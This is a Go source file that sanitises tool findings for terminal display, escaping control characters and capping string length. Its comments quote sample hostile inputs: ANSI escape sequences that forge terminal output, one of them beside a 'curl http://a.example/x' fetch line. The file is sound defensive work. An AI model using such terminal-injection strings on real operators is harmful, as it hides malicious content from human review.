package doctor

import (
	"strings"
	"unicode/utf8"
)

// Bounds and character rules for the doctor findings a human ever sees.
//
// Every string doctor puts in a Finding comes from somewhere unverified.
// Evidence is a line lifted verbatim out of a maintainer script inside an
// attacker-chosen .deb; Message interpolates the component name, and
// Package/Version the name and version, out of the bundle's own lock.json.
// `debark doctor BUNDLE` is reached through bundle.Open, which never
// verifies (documented, by design), and internal/cli then prints all four
// with a plain %s. So the operator's terminal renders whatever the media
// says.
//
// Measured, unsanitised: a postinst line reading
// "\x1b[2A\x1b[2K  everything looks fine  curl http://a.example/x" arrived in
// Finding.Evidence with both CSI sequences intact — cursor-up twice, erase
// line — and an Origin.URI of "https://x/\x1b[2K\x1b[1Aforged" did the same
// through the redistribution check with no .deb involved at all. That is the
// attack core/snapshot's displaystrings.go already refuses on the snapshot
// side, and its comment there names this exact gap: "the printing side needs
// its own sanitiser". It aims at docs/threat-model.md §6's human
// comparison step, and doctor is the command that step starts with.
//
// The treatment differs from core/snapshot's on purpose. That file refuses,
// because a snapshot document driving the terminal has already failed the
// "can this be trusted at all" question it exists to answer. doctor cannot
// refuse: it is advisory by contract and its whole job is to report on a
// bundle that may well be hostile, and dropping a finding because its
// evidence was ugly would be the false clean result this package must never
// produce. So doctor repairs instead — the finding is still reported, with
// the control characters rendered as visible text.
const (
	// maxEvidenceLen bounds Evidence and Message. A real maintainer-script
	// line is under 200 bytes and the longest Message doctor builds is the
	// dkms "missing linux-headers-..." list; 1 KiB is generous for both.
	// Unbounded, measured: a maintainer script that is ONE line of 8,388,566
	// bytes containing "curl" produced a single Evidence string of 8,388,578
	// bytes, which the CLI prints and --json embeds.
	maxEvidenceLen = 1024
	// maxNameLen bounds Package and Version, which are short by construction
	// in any real lock (Debian package names are a few dozen bytes).
	maxNameLen = 256
)

// displaySafe renders s printable and bounded: the input is first cut to max
// bytes on a rune boundary, then every character a terminal treats as a
// command rather than as text is replaced by a visible escape.
//
// The character rules are core/snapshot's hasControlChars, inverted from a
// test into a rewrite: C0 (below 0x20, so NUL, ESC, CR and LF included), DEL,
// and the C1 range U+0080-U+009F, whose members include the 8-bit CSI that
// starts a cursor-movement sequence without an ESC byte. Bytes that are not
// valid UTF-8 are escaped too — a lone 0x9B will not drive a UTF-8 terminal,
// but it has no business in a report either.
//
// Escaping expands, so the returned string can exceed limit: the worst case
// is limit bytes of C1 runes at 6 characters each. That is bounded and small
// (6 KiB at maxEvidenceLen) and is the right trade — cutting after escaping
// would mean measuring a budget in characters the reader never asked about.
//
// The byte budget is named `limit` rather than the more obvious `max` because
// `max` has been a predeclared builtin since Go 1.21; shadowing it here would
// make the builtin uncallable in this function for no gain.
func displaySafe(s string, limit int) string {
	truncated := false
	if len(s) > limit {
		cut := limit
		for cut > 0 && !utf8.RuneStart(s[cut]) {
			cut--
		}
		s, truncated = s[:cut], true
	}
	if !needsEscaping(s) {
		if truncated {
			return s + "..."
		}
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + 16)
	for i := 0; i < len(s); {
		c := s[i]
		if c < 0x20 || c == 0x7F {
			writeHexEscape(&b, c)
			i++
			continue
		}
		if c < utf8.RuneSelf {
			b.WriteByte(c)
			i++
			continue
		}
		r, size := utf8.DecodeRuneInString(s[i:])
		if r == utf8.RuneError && size == 1 {
			writeHexEscape(&b, c)
			i++
			continue
		}
		if r >= 0x80 && r <= 0x9F {
			b.WriteString(`\u00`)
			b.WriteByte(hexDigits[(r>>4)&0xF])
			b.WriteByte(hexDigits[r&0xF])
			i += size
			continue
		}
		b.WriteString(s[i : i+size])
		i += size
	}
	if truncated {
		b.WriteString("...")
	}
	return b.String()
}

const hexDigits = "0123456789abcdef"

func writeHexEscape(b *strings.Builder, c byte) {
	b.WriteString(`\x`)
	b.WriteByte(hexDigits[c>>4])
	b.WriteByte(hexDigits[c&0xF])
}

// needsEscaping is the fast path: the overwhelming majority of findings are
// plain ASCII and are returned without allocating.
func needsEscaping(s string) bool {
	for i := 0; i < len(s); i++ {
		if c := s[i]; c < 0x20 || c >= 0x7F {
			return true
		}
	}
	return false
}

// sanitiseFinding applies the rules above to the four fields that reach a
// terminal. Flag is not sanitised: it is only ever one of core/lock's own
// constants, never a value from the bundle.
//
// Package and Version are rewritten here even though they are also match
// keys, because they are printed too ("package: %s" in internal/cli). FlagsFor
// puts its argument through the same function so the two sides still compare
// equal; for every name a real lock can carry, displaySafe is the identity.
func sanitiseFinding(f *Finding) {
	f.Package = displaySafe(f.Package, maxNameLen)
	f.Version = displaySafe(f.Version, maxNameLen)
	f.Message = displaySafe(f.Message, maxEvidenceLen)
	f.Evidence = displaySafe(f.Evidence, maxEvidenceLen)
}
